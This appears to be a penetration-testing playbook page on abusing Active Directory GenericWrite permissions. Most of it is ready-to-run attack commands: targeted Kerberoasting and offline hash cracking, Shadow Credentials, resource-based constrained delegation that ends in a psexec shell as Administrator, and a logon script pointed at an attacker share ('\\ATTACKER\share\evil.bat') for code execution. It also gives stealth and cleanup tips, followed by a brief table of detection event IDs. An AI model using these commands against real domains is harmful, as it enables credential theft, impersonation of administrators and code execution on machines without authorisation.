---
title: "Attack #20 — GenericWrite Abuse"
description: "GenericWrite allows an attacker to write to any non-protected attribute on a target AD object. While it doesn't grant full control like GenericAll, it…"
category: active-directory
subcategory: "ACL Abuse"
tags: ["active-directory", "kerberos", "hashing"]
tools: ["Rubeus", "Certipy", "Hashcat", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #20 — GenericWrite Abuse.md"
---
# 🟡 Attack #20 — GenericWrite Abuse

***

## 📖 How It Works

GenericWrite allows an attacker to **write to any non-protected attribute** on a target AD object. While it doesn't grant full control like GenericAll, it enables several powerful exploitation paths: **Targeted Kerberoasting** (set an SPN on a user, roast their hash), **Shadow Credentials** (write to `msDS-KeyCredentialLink` for passwordless auth), **logon script modification**, and **RBCD configuration** (write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on computers).

### Exploitation Methods by Target Type

| Target Type | Method | What You Write | Result |
|---|---|---|---|
| **User** | Targeted Kerberoasting | `servicePrincipalName` | Crack their hash offline |
| **User** | Shadow Credentials | `msDS-KeyCredentialLink` | Auth as target via PKINIT |
| **User** | Logon Script | `scriptPath` | Code execution on next logon |
| **Computer** | RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Impersonate any user to that host |
| **Computer** | Shadow Credentials | `msDS-KeyCredentialLink` | Auth as that computer |
| **Group** | ❌ Cannot add members | N/A | GenericWrite ≠ WriteMembers for groups |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **GenericWrite ACE on target** | Must exist in the target object's DACL |
| **Domain user account** | Any authenticated domain user |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **PowerView** | Windows | `Set-DomainObject` for attribute manipulation |
| **Whisker** | Windows | Shadow Credentials exploitation |
| **pyWhisker** | Linux | Python Shadow Credentials tool |
| **Certipy** | Linux | `shadow auto` for automated Shadow Creds |
| **Rubeus** | Windows | Kerberoasting, PKINIT auth |
| **bloodyAD** | Linux | All-in-one AD exploitation |

***

## 💻 Full Commands

### 🔴 Method 1 — Targeted Kerberoasting

```powershell
# ── Set SPN on target user ────────────────────────────────────────────────────
Set-DomainObject -Identity targetadmin -Set @{serviceprincipalname='fake/kerberoast'}

# ── Roast the hash ────────────────────────────────────────────────────────────
.\Rubeus.exe kerberoast /user:targetadmin /outfile:roast.txt

# ── Crack offline ─────────────────────────────────────────────────────────────
hashcat -m 13100 roast.txt rockyou.txt --force

# ── Clean up — remove the SPN ────────────────────────────────────────────────
Set-DomainObject -Identity targetadmin -Clear serviceprincipalname
```

```bash
# ── Linux — targeted kerberoasting ────────────────────────────────────────────
# Set SPN via bloodyAD
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set object targetadmin servicePrincipalName -v 'fake/kerberoast'

# Roast
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 \
  -request-user targetadmin -outputfile roast.txt

# Clean up
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set object targetadmin servicePrincipalName
```

### 🔴 Method 2 — Shadow Credentials

```powershell
# ── Whisker — add shadow credential to target user ───────────────────────────
.\Whisker.exe add /target:targetadmin /domain:corp.local /dc:DC01.corp.local
# Outputs a Rubeus command to request TGT with the new key credential

# Run the outputted Rubeus command to get a TGT as targetadmin
```

```bash
# ── pyWhisker ─────────────────────────────────────────────────────────────────
python3 pywhisker.py -d corp.local -u low_user -p 'Password1' \
  --target targetadmin --action add --dc-ip 10.10.10.10

# ── Certipy shadow auto (easiest) ────────────────────────────────────────────
certipy shadow auto -u low_user@corp.local -p 'Password1' \
  -account targetadmin -dc-ip 10.10.10.10
# Outputs: NT hash and TGT for targetadmin
```

### 🔴 Method 3 — RBCD (on Computer objects)

```bash
# ── Configure RBCD on target computer ─────────────────────────────────────────
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass123!' \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' \
  -action write -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

getST.py -spn cifs/TARGET.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.10 corp.local/'FAKE$':'Pass123!'

export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
```

### 🔴 Method 4 — Logon Script Modification

```powershell
# ── Set malicious logon script path ───────────────────────────────────────────
Set-DomainObject -Identity targetadmin -Set @{scriptpath='\\ATTACKER\share\evil.bat'}
# Next time targetadmin logs in, evil.bat executes in their context
```

***

## 🎯 OPSEC Tips

- **Shadow Credentials is the stealthiest method** — original password unchanged, persistent access
- **Targeted Kerberoasting requires cleanup** — always remove the SPN after getting the hash
- **GenericWrite on groups does NOT let you add members** — you need WriteMembers or GenericAll for that
- **Monitor Event 5136** for all methods — it catches attribute modifications

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5136** | Security Log (DC) | Attribute modification: `servicePrincipalName`, `msDS-KeyCredentialLink`, `scriptPath`, `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| **4738** | Security Log (DC) | User account changed — SPN modification |
| **4741** | Security Log (DC) | Computer account created (RBCD path) |

***

## 🔗 Attack Chain Context

```
[GenericWrite] ──→ Multiple Escalation Paths
         │
         ├──→ 🎫 Targeted Kerberoasting → crack password → impersonate user
         ├──→ 🔑 Shadow Credentials → passwordless auth as target
         ├──→ 💻 RBCD on computers → impersonate DA to that host
         ├──→ 📋 Logon script → code execution on target's next logon
         └──→ 💀 Defeated by: ACL auditing, monitor 5136, least privilege
```

***

> ✅ **Attack #20 — GenericWrite Abuse complete.**
